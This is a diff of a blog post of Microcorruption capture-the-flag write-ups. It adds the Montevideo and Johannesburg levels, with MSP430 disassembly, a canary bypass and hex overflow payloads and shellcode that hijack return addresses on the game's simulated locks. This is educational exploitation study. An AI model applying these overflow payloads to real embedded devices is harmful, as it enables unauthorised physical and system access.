@@ -1,6 +1,5 @@
 ---
 title: Microcorruption Notes
-author: vmovupd
 date: 2025-01-07 18:00:00 +0000
 categories: [Blog, Embedded Security]
 tags: [microcorruption]
@@ -30,7 +29,7 @@ In Tutorial level (which seems to be located in Chicago according to the map), t
 449a:  3041           ret
 ```
 
-## New Orleans
+## New Orleans (rev a.01)
 
 The function `check_password` checks if the password is the one that is stored in memory at the address `0x2400`.
 ```assembly
@@ -52,7 +51,7 @@ The function `check_password` checks if the password is the one that is stored i
 Live memory dump of the address:
 ```2400: 605c 2559 6259 7300 0000 0000 0000 0000   `\%YbYs.........```
 
-## Sydney
+## Sydney (rev a.02)
 
 The password is hardcoded in the `check_password` function instructions as the bytes are compared directly. One has to consider the endiannes as MSP430 is little endian and check that the input is hex encoded. The password is `542c4f545a465a4f`.
 ```assembly
@@ -71,7 +70,7 @@ The password is hardcoded in the `check_password` function instructions as the b
 44b0:  3041           ret
 ```
 
-## Hanoi
+## Hanoi (rev b.01)
 
 First lock with HSM, module 1. The program informs the user that the password shall be between 8 and 16 characters. `test_password_valid` function performs an interrupt (`0x7d`) to test whether the password provided by the user (stored at `0x2400`, passed as `r15`) is correct and if so, set a flag at `0x43f8`, passed as `r14`; the flag is written to `r15` at the end of the function. In the `login` function, however, the door is unlocked based on the value at the address `0x2410` (the value is controlled by the attacker as there is no bounds checking, even though the program specifies required password length) which shall be `0x31` (1 in ASCII). `r15` is only used to determine whether or not the value at `0x2410` shall be overwritten with `a8` which would effectively **prevent the user from unlocking the door, if the password is correct**.
 
@@ -97,7 +96,7 @@ First lock with HSM, module 1. The program informs the user that the password sh
 
 So to get the door unlocked, input shall override 17th byte (`0x2410`) to 1 (`0x31`).
 
-## Cusco
+## Cusco (rev b.02)
 
 This is the second version of the lock from Hanoi, the changelog states `fixed issues with passwords which may be too long`. The password is written on the stack and stack pointer points to the password after it has been entered. At the end of the `login` function, the program adds 16 bytes to the stack pointer and returns to the address pointed by the stack pointer:
 ```assembly
@@ -115,7 +114,7 @@ The stack to visualize the exploitation:
 4400: 0040 0044 1542 5c01 75f3 35d0 085a 3f40   .@.D.B\.u.5..Z?@
 ```
 
-## Reykjavik
+## Reykjavik (rev a.03)
 
 There is no HSM, but `developers have implemented military-grade on-device encryption to keep the password secure`. Before `main` is called, function `__do_copy_data` copies `0x7c` bytes from `0x4538` to `0x2400`. The data block contains the following bytes that are not valid instructions:
 ```
@@ -154,7 +153,7 @@ It prints the message `what's the password?` (stored at `0x4520`) and asks the u
 
 The reason for having `0xf8` as the size of encrypted data and not `0x7c` (true encrypted data block size) may be to overwrite the key stream or confuse the attacker.
 
-## Whitehorse
+## Whitehorse (rev c.01)
 
 The lock is attached to HSM, module 2. **The main difference between HSM module 1 and HSM module 2** is that the first one only checks the password and sets the flag in memory, while second checks the password and sends an interrupt to unlock the door. Essentialy, this is an upgraded version of the lock from Cusco level. `main` contains only a call to `conditional_unlock_door`; there is no `unlock_door` function in the program at all. Thus, shellcode written on the stack which would replicate the `unlock_door` functionality is required to unlock the door. The shellcode will be executed using using the same technique from Cusco.
 
@@ -166,6 +165,70 @@ call    #0x4532 <INT>
 The password is written to `0x3088` and the return address is stored at `0x3098`. There is no need to worry about the size of the shellcode as `0x30` is passed to `getsn` function, meaning the shellcode size can be not more than 46 bytes (2 bytes are taken by the return address). It is possible to execute shellcode after (the return address will point to `0x309a`) or before the return address (the return address will point to `0x3088`) as there is enough space for both approaches (the amount of CPU cycles is the same):
 * After: `313131313131313131313131313131319a3030127f00b0123245`
 * Before: `30127f00b012324531313131313131318830`
+
+## Montevideo (rev c.03)
+
+The lock is attached to HSM, module 2 and `developers have rewritten the code  to conform to the internal secure development process`. This is an improvement over Whitehorse level. `login` function now writes the password provided by the user to `0x2400` and then copies it to the stack utilizing `strcpy` followed by a call to `memset` which zeroes the memory where the password was stored:
+
+```assembly
+44f4 <login>
+...
+4508:  3e40 3000      mov	#0x30, r14
+450c:  3f40 0024      mov	#0x2400, r15
+4510:  b012 a045      call	#0x45a0 <getsn>
+4514:  3e40 0024      mov	#0x2400, r14
+4518:  0f41           mov	sp, r15
+451a:  b012 dc45      call	#0x45dc <strcpy>
+451e:  3d40 6400      mov	#0x64, r13
+4522:  0e43           clr	r14
+4524:  3f40 0024      mov	#0x2400, r15
+4528:  b012 f045      call	#0x45f0 <memset>
+...
+4544:  3150 1000      add	#0x10, sp
+4548:  3041           ret
+```
+
+`strcpy` copies the [null-terminated string](https://en.cppreference.com/w/cpp/string/byte/strcpy), meaning that if the shellcode contains null bytes, then it will be truncated. The only null byte in Whiterose solution is `push #0x7f` which is assembled to `30127f00`. Null bytes can be prevented by using arithmetical operations (XOR, SUB, ADD). The shellcode may look as follows:
+```assembly
+3f40 8011      mov	#0x1180, r15
+3fe0 ff11      xor	#0x11ff, r15 ; r15 now contains 0x7f
+0f12           push	r15
+b012 4c45      call	#0x454c
+```
+The password is written to `0x43ee`, the return address is stored at `0x43fe` and `INT` function is at `0x454c`. As with Whiterose level, it is possible to execute shellcode after (the return address will point to `0x4402`; not to `0x4400` because of the null byte; not to `0x4401` because the instruction address will be unaligned) or before the return address (the return address will point to `0x43ee`):
+* After: `31313131313131313131313131313131024431313f4080113fe0ff110f12b0124c45` (more CPU cycles because of `strcpy`)
+* Before: `3f4080113fe0ff110f12b0124c453131ee43`
+
+Another solution would be to take `0x7e` which is passed to `INT` function inside `conditional_unlock_door` at `0x445e` (`445c:  3012 7e00      push	#0x7e`), write it in `r15` and increment, thus creating `0x7f`:
+```assembly
+1f42 5e44    mov &0x445e, r15
+1f53         inc r15
+```
+The shellcode looks as follows: `1f425e441f530f12b0124c4531313131ee43`. It is *2 bytes less in length* comparing to the previous approach (particularly, executing shellcode *before* the return address), although the amount of CPU cycles is the same.
+
+The same approach can be applied for Whitehorse level as well, but the memory addresses are different: `1f425e441f530f12b0123245313131318830`
+
+## Johannesburg (rev b.04)
+
+The lock is attached to HSM, module 1 and `a firmware update rejects passwords which are too long`. The program uses `strcpy` and contains `unlock_door` function that is located at `0x4446`. `login` function also contains hardcoded stack canary (`0x30`) at `0x43fd` (byte before the return address on the stack):
+```assembly
+452c <login>
+...
+4552:  3e40 0024      mov	#0x2400, r14
+4556:  0f41           mov	sp, r15
+4558:  b012 2446      call	#0x4624 <strcpy>
+...
+4570:  3f40 e144      mov	#0x44e1 "That password is not correct.", r15
+4574:  b012 f845      call	#0x45f8 <puts>
+4578:  f190 3000 1100 cmp.b	#0x30, 0x11(sp) ; hardcoded stack canary
+457e:  0624           jz	$+0xe <login+0x60>
+4580:  3f40 ff44      mov	#0x44ff "Invalid Password Length: password too long.", r15
+4584:  b012 f845      call	#0x45f8 <puts>
+4588:  3040 3c44      br	#0x443c <__stop_progExec__>
+458c:  3150 1200      add	#0x12, sp
+4590:  3041           ret
+```
+The password is written to `0x43ec` and the return address is stored at `0x43fe`. With hardcoded stack canary, the 18th byte of the shellcode must be `0x30` followed by the address of `unlock_door`: `3131313131313131313131313131313131304644`.
 
 ## Offtop
 Baku is located in Kyrgystan on the map.
